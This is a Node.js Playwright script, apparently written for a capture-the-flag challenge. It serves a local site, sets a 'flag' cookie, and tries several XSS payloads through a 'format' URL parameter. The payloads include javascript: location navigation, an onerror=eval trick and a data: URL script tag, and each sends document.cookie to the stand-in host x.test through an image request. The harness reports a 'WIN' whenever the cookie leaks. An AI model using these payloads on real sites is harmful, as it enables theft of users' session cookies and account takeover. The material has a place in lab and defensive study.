const http=require("http"),fs=require("fs"),path=require("path");
const {chromium}=require("playwright");
const SITE=path.join(__dirname,"site"),PORT=8099,COOKIE="FLAGMARK_abc123";
const server=http.createServer((req,res)=>{let p=decodeURIComponent(req.url.split("?")[0]);if(p==="/")p="/index.html";fs.readFile(path.join(SITE,p),(e,d)=>{if(e){res.writeHead(200,{"Content-Type":"text/html"});return res.end(fs.readFileSync(path.join(SITE,"index.html")));}const x=path.extname(p);res.writeHead(200,{"Content-Type":x===".js"?"text/javascript":x===".css"?"text/css":"text/html"});res.end(d);});});
const q=o=>Object.entries(o).map(([k,v])=>k+"="+encodeURIComponent(v)).join("&");
(async()=>{
  await new Promise(r=>server.listen(PORT,r));
  const browser=await chromium.launch();
  const ctx=await browser.newContext();
  await ctx.addCookies([{name:"flag",value:COOKIE,url:`http://localhost:${PORT}`,httpOnly:false}]);
  async function test(format,formula){
    const page=await ctx.newPage();const eg=[];
    page.on("dialog",d=>{eg.push("DLG:"+d.message().slice(0,120));d.dismiss().catch(()=>{});});
    page.on("console",m=>{const t=m.text();if(t.includes(COOKIE)||t.includes("PWN"))eg.push("CON:"+t.slice(0,120));});
    await page.route("**",r=>{const u=r.request().url();if(u.startsWith(`http://localhost:${PORT}`))return r.continue();eg.push(u.slice(0,200));return r.abort();});
    const url=`http://localhost:${PORT}/?`+q({x:"1",y:"2",formula:formula||"x + y",format,autoEval:"1"});
    try{await page.goto(url,{waitUntil:"domcontentloaded",timeout:8000});}catch(e){}
    await page.waitForTimeout(1200);
    let a="";try{a=await page.$eval("#answer",e=>e.textContent);}catch(e){a="(nav)";}
    await page.close();
    return {format,answer:(a||"").slice(0,40),eg,win:eg.some(e=>e.includes(COOKIE))};
  }
  const JS=`new Image().src='http://x.test/JHIT?c='+document.cookie`;
  const T=[
    // javascript: navigation via location (quoted -> opaque code)
    `,[location="javascript:${JS}"]`,
    `,[name="javascript:${JS}"][location=name]`,
    // onerror=eval then trigger async error running our code (setInterval string)
    `,[onerror=eval]`,
    // set onerror=alert, cause error to see if onerror fires from async
    `,[onerror=alert][z=setInterval]`,
    // location to data: url
    `,[location="data:text/html,<script>${JS}<\\/script>"]`,
    // try: [location] via <a> ping? no.
    // set document.title? not exec
    // window.location assignment via array + eval of name using setTimeout string:
    `,[name="${JS}"]`,   // just set name to code (no exec) baseline
  ];
  console.log("== javascript:/onerror tests ==");
  for(const f of T){const r=await test(f,null);console.log((r.win?"WIN ":"    ")+JSON.stringify(r));}
  await browser.close();server.close();
})();
